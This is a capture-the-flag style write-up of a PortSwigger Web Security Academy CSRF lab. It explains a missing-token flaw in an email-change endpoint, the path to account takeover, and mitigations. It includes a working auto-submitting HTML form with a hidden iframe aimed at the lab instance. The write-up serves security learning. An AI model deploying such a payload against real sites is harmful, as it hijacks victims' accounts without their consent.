# CSRF vulnerability with no defenses
---
## TARGET
PortSwigger Web Security Academy  
Lab: _CSRF vulnerability with no defenses_
Vulnerability: _Cross-Site Request Forgery (CSRF)_

---
## DESCRIPTION
The application's email change functionality lacks Cross-Site Request Forgery defenses. All three critical conditions for a CSRF attack are met: a relevant state-changing action, cookie-based session handling, and an absence of unpredictable request parameters. An attacker exploits  this by hosting a malicious HTML page that automatically submits a POST request to forcefully change an authenticated user's email address.

---
## ROOT CAUSE
The application fails to implement anti-CSRD tokens and relies solely on cookie-based session handling without SameSite arribute restrictions. Consequently, the server blindly processes state changing POST requests originating from external domains as long as browser automatically appends the victim's session cookie.

---
## ATTACK SCENARIO
1. Identifies the `POST /my-account/change-email` endpoint as vulnerable due to the lack of validation tokens
2. Crafts a malicious HTML payload containing a hidden, auto-submitting form targeting the vulnerable endpoint with a new email parameter (`sithum@sa.com`).
3. Hosts the malicious HTML page on an attacker-controlled exploit server.
4. Delivers the exploit URL to the authenticated victim.
5. Executes the payload silently in the victim's browser via a hidden iframe, forcibly updating the account email address.
---
## PROOF OF CONCEPT
**Target Endpoint:** `POST /my-account/change-email`
**Exploit Payload:** 
```HTML
<html>
  <body>
    <h1>Hello World!</h1>
    <iframe style="display:none" name="csrf-iframe"></iframe>
    <form action="https://0a2800ae04ac7aee801c037c00df00d6.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
      <input type="hidden" name="email" value="sithum@sa.com">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
  </body>
</html>
```

---
## IMPACT
This vulnerability enables full account takeover. By forcefully changing the victim's registered email address to an attacker-controlled address, the attacker can subsequently execute a password reset and gain unauthorized access to the account.

---
## FIX / MITIGATION
Implement unpredictable, cryptographically generated anti-CSRF tokens for all state-changing requests. Additionally, configure all session cookies with the `SameSite=strict` or `SateSite=lax` attribute to prevent browsers from appending session cookies to cross-domain POST requests.

---
## KEY LEARNING
Never rely exclusively on standard session cookies for authentication on state-changing actions; unpredictable validation tokens and strict cookie attributes are required.

---
